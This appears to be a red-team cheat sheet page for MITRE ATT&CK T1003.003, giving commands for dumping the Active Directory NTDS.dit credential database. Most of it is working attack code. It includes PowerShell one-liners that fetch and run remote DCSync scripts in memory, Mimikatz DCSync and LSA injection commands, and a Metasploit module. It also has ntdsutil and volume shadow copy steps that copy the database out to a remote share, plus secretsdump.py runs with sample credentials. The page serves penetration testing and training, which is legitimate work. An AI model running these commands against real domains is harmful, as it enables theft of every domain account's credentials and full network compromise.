

# Description:

https://attack.mitre.org/techniques/T1003/003/

# NTDS

**ATT\&CK ID:** [T1003.003](https://attack.mitre.org/techniques/T1003/003/)

**Permissions Required:** <mark style="color:red;">**Administrator**</mark> | <mark style="color:red;">**SYSTEM**</mark>

**Description**

Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in `%SystemRoot%\NTDS\Ntds.dit` of a domain controller.

In addition to looking for NTDS files on active Domain Controllers, adversaries may search for backups that contain the same or similar information.

## Techniques

### Invoke-DCsync (PentestFactory)

**URL:** [https://github.com/pentestfactory/Invoke-DCSync](https://github.com/pentestfactory/Invoke-DCSync)

Invoke-DCsync pulls Mimikatz,PowerView and ADRecon from Github into memory and then performs DCSync.

```powershell
# Load into memory
IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/pentestfactory/Invoke-DCSync/main/Invoke-DCSync.ps1")

# Execute
Invoke-DCSync
```

![](../../../Assets/Pasted%20image%2020250619221044.png)

### Invoke-DCSync (S3cur3Th1sSh1t)

```powershell
# Load into memory
IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-DCSync.ps1")

# Execute
Invoke-DCSync -dcfqdn DC01.security.local -username administrator
```

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Metasploit

```bash
use auxiliary/admin/smb/psexec_ntdsgrab
```

![](../../../Assets/Pasted%20image%2020250619221058.png)

`secretsdump.py` can then be used to pull hashes from the `ntds.dit` database using the SYSTEM hive file (ref: secretsdump.py further down).

### Mimikatz

```powershell
# Dump hashes for a specified users
Invoke-Mimikatz -command '"lsadump::dcsync /domain:security.local /user:moe"'

# Dump hashes for all users
Invoke-Mimikatz -command '"lsadump::dcsync /domain:security.local /all"'

# Dump hashes by injecting into the lsass process on the Domain Controller
Invoke-Mimikatz -command '"lsadump::lsa /inject"'
```

![](../../../Assets/Pasted%20image%2020250619221105.png)

### ntdsutil.exe (Native)

With access to the Domain Controller its possible to run the `ntdsutil.exe` native binary to dump SAM, SYSTEM and ntds.dit ready for exfiltration.

```powershell
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\Exfiltration' q q"

# Dump to remote share
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full \\10.10.10.10\Share\Exf' q q"
```

![](../../../Assets/Pasted%20image%2020250619221114.png)

Viewing the contents of `c:\Exfiltration` we see the files.

![](../../../Assets/Pasted%20image%2020250619221127.png)

Secretsdump we can be used against these files for extraction as shown in the `secretsdump.py` section below.

### Secretsdump.py

```bash
# With valid credentials
secretsdump.py security.local/moe:Password123@10.10.10.100 -just-dc-ntlm
```

![](../../../Assets/Pasted%20image%2020250619221138.png)

```bash
# Dump from exfiltrated ntds.dit and SYSTEM files.
sudo secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

![](../../../Assets/Pasted%20image%2020250619221148.png)

```bash
# Dump results from ntdsutil.exe method
secretsdump.py -system SYSTEM -security SECURITY -ntds ntds.dit LOCAL
```

### PsMapExec

```powershell
# As current user
PsMapExec -Targets DCs -Method SMB -Module NTDS

# As a specified user
PsMapExec -Targets DCs -Method SMB -Module NTDS -Username Administrator -Password Password123!
```

![](../../../Assets/Pasted%20image%2020250619221200.png)

### Volume Shadow Copy

```bash
# Create VSS snapshot of system drive
vssadmin create shadow /for=C:

# create a copy of NTDS.dit and SYSTEM then move to C:\Exfiltration
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\Exfiltration
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SYSTEM C:\Exfiltration
```

![](../../../Assets/Pasted%20image%2020250619221207.png)

The NTDS.dit and SYSTEM files can be exfiltrated off the system and used with a tool such as `secretsdump.py` for hash extraction.
